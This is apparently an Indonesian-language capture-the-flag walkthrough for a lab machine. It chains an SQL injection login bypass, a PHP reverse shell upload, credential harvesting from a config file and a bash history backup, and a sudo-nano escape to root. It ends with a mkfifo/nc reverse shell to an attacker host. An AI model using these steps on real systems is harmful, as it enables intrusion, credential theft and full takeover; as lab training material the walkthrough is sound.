Login dengan SQLI
    - `admin'-- -` + random passwd

Selanjutnya lakukan upload revhsell.php karena tidak ada blacklisting
setup listener `ncat -lvnp port`
stabilize shell dengan cara
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
# CTRL+Z
stty raw -echo; fg
```

Dapat creds mysql di `initialize.php`
```
...
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
...
```
dan kita dapat creds dari admin dengan login mysql `mysql -u gallery_user -p gallery_db` password=`passw0rd321`. Selanjutnya kita bisa ambil creds dengan `use gallery_db` lalu `select * from users where username="admin";` 
`admin    | a228b12a08b6527e7978cbe5d914531c`

Dapat creds mike dari running linpeas
```
╔══════════╣ Searching passwords in history files                                                         
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @stats   = stats                           
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @items   = { _seq_: 1  }                   
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @threads = { _seq_: "A" }                  
/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx                                      
/var/backups/mike_home_backup/.bash_history:sudo -l
```
creds `mike:b3stpassw0rdbr0xx`

escalate menjadi user mike, dan ketika cek sudo -l hasilnya
```
...
User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```
dan jika kita cek isinya, akan seperti berikut
```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```
dari code diatas, kita dapat memanfaatkan nano untuk privesc ke root. pastikan TERM environment adalah xterm/linux

Selanjutnya gunakan nano untuk escape dan mendapat root shell
```bash
CTRL+R CTRL+X
reset; sh 1>&0 2>&0
```
akan sedikit membingungkan tampilannya, jadi kita bisa buat revshell lagi dengan mkfifo
setup listener
```
ncat -lvnp 2222
```
selanjunty pada target gunakan mkfifo
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc IP-local 2222 >/tmp/f
```
dan kita mendapat rootshell. bebas menggunakan untuk post exploit.


